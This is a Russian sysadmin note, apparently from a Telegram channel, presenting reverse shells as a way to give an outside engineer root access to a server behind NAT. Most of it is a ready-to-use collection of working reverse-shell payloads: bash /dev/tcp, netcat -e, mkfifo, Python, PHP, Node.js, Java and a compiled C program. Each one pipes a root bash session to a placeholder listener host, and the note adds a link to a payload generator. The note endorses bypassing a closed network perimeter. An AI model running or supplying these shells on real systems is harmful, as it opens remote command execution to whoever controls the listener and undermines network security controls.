---
author: WhiteK0T
Источник:
  - https://t.me/bashdays/541
tags:
  - ReverseShell
  - NetCat
создал заметку: 2024-12-05T02:37:00
---

# Reverse Shell

Интересная темка, которую частенько используют пентестеры в своей работе.

Но темка это не только пентестерская, она вполне применима для рядовых админов и девопс инженеров. И порой я ей пользуюсь.
Многие знают Linux утилиту nc = netcat, вот с помощью нее можно подключаться к серверам у которых нет прямого айпи адреса, а есть только внутренний, либо все за NAT лежит.
Темка называется — Reverse Shell. Про неё ты тоже всяко слышал. В подробности вдаваться не будем, потыкаем на практике чтобы тебе все стало понятно.
У меня есть сервер в закрытом периметре без внешнего айпи адреса.
Нужно выдать доступ левому инженеру из мухосранска, который подключиться к этому серверу и произведет работы на сервере.
Как быть? Привязывать белый айпишник не вариант. Бастиона нет. SSH тоннели не канают. Тут-то на помощь и приходит netcat.

Просим инженера из мухосранска запустить у себя:
```bash
root@engineer:/ nc -lvnp 2288
```

В ответ он получает строчку вида: `Listening on 0.0.0.0 2288`

**-l** = слушать входящие соединения
**-v** = быть более подробным
**-n** = использовать IP-адреса без DNS
**-p** = порт

Дальше я иду на сервер, который не имеет белого айпишника и запускаю на нём:
```bash
/bin/bash -i > /dev/tcp/IP_мухосранска/2288 0<&1 2>&1
```

или если стоит **nc** :
```bash
nc -nv IP_мухосранска 2288 -e /bin/bash
```

> [!warning] Какой у тебя netcat?
> Флаг `-e` есть только в **traditional**-варианте (`nc.traditional`) и в `ncat`. В большинстве современных дистрибутивов стоит **netcat-openbsd**, где `-e` вырезан. По той же причине листенер выше (`nc -lvnp 2288`) — синтаксис traditional-nc; в openbsd-варианте порт указывается позиционно: `nc -lvn 2288`.
>
> Если `-e` недоступен — тот же reverse shell через именованный канал (`mkfifo`), работает с любым netcat:
> ```bash
> rm -f /tmp/f; mkfifo /tmp/f
> cat /tmp/f | /bin/bash -i 2>&1 | nc IP_мухосранска 2288 > /tmp/f
> ```
> А bash-однострочник через `/dev/tcp` (выше) вообще не требует netcat на закрытом сервере — нужен только bash.

Не забываем у инженера узнать его IP, чтобы подставить его в команду. Важно: машина инженера (где слушает `nc`) должна быть **достижима** с закрытого сервера — белый IP или проброс порта на роутере. Если инженер сам за NAT, нужен промежуточный хост с белым IP.
Все эти штуки с перенаправлением `0<&1 2>&1` описывать не буду, мудрёные премудрости, сто раз уже мусолили в постах. Если интересно, спроси у GPT.
А дальше… магия!
В мухосранске, там где запустили `nc -lvnp 2288`, произойдет такое:

```bash
Listening on 0.0.0.0 2288
Connection received on 147.45.73.123 50740
root@stage1:~#
```

У инженера сменится шелл с root@engineer на root@stage1 и он получит доступ к нашему закрытому серверу без белого айпишника. Ну красота же!
Ну а дальше можно и админить всё это дело пользуясь всеми благами командной строки.
Для всего происходящего могут понадобиться рут права, поэтому сразу делаем на это погрешность.

## Reverse shell на других языках

На закрытом сервере может не оказаться `nc`, да и bash не везде. Зато почти всегда есть какой-нибудь интерпретатор. Все примеры ниже стучатся на тот же листенер инженера (`IP_мухосранска`, порт `2288`) — слушать так же: `nc -lvnp 2288` (или `nc -lvn 2288` для openbsd-варианта). Подставь свой IP и порт.

### Python

Самый удобный — сразу поднимает полноценный TTY через `pty`:
```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP_мухосранска",2288));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

### PHP

Дескриптор сокета от `fsockopen` обычно получает номер `3`:
```bash
php -r '$s=fsockopen("IP_мухосранска",2288);$p=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$pipes);'
```

### JavaScript (Node.js)

```bash
node -e 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/bash",[]);var c=new net.Socket();c.connect(2288,"IP_мухосранска",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'
```

### Java

`/dev/tcp`-трюк, обёрнутый в вызов bash (надёжнее, чем возня с потоками):
```java
String[] cmd = {"/bin/bash","-c","exec 5<>/dev/tcp/IP_мухосранска/2288;cat <&5 | while read line; do $line 2>&5 >&5; done"};
Process p = Runtime.getRuntime().exec(cmd);
p.waitFor();
```

### C

Классика: `socket` → `connect` → `dup2` на 0/1/2 → `execve`.
```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(void) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(2288);
    sa.sin_addr.s_addr = inet_addr("IP_мухосранска");   // IP инженера

    connect(sock, (struct sockaddr *)&sa, sizeof(sa));
    dup2(sock, 0);   // stdin
    dup2(sock, 1);   // stdout
    dup2(sock, 2);   // stderr
    execve("/bin/bash", NULL, NULL);
    return 0;
}
```
Собрать: `gcc rsh.c -o rsh && ./rsh`.

> [!tip] Шпаргалки
> Готовые пейлоады под кучу языков и ситуаций удобно генерить через [revshells.com](https://www.revshells.com/) — там же сразу команда для листенера. Исходники проекта на GitHub: [0dayCTF/reverse-shell-generator](https://github.com/0dayCTF/reverse-shell-generator).

#ReverseShell
#NetCat